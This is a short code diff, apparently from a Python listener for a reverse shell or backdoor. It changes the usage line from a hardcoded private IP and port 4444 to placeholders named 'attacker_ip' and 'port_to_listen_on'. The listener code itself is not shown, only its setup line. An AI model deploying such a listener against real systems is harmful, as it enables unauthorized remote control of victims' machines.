@@ -72,5 +72,5 @@ class Listener:
                 print(result)
 
 # Usage: Initialize Listener and run
-my_listener = Listener("192.168.141.130", 4444)
+my_listener = Listener("attacker_ip", port_to_listen_on)
 my_listener.run()
